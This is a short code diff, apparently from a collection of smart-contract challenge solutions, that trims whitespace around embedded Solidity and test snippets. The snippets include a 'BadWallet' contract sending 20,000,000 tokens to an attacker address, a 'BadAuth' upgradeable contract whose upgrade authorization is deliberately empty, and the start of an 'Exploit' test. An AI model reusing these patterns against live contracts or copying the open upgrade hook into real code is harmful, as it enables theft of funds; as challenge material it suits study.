@@ -758,8 +758,7 @@ contract BadWallet {
         IERC20(token).transfer(attackerEOA, 20_000_000 ether);
     }
 }`,
-                `
-//SPDX-License-Identifier:MIT
+                `//SPDX-License-Identifier:MIT
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
@@ -774,8 +773,7 @@ contract BadAuth is UUPSUpgradeable {
 
     function _authorizeUpgrade(address imp) internal override {}
 }`,
-                `
-it("Exploit", async function () {
+                `it("Exploit", async function () {
     ///////////////////////////////////////////////////////////////////////////////////////////////
     //fund the factory deployer (this is the original GnosisSafeProxyFactory deployer from mainnet)
     await player.sendTransaction({
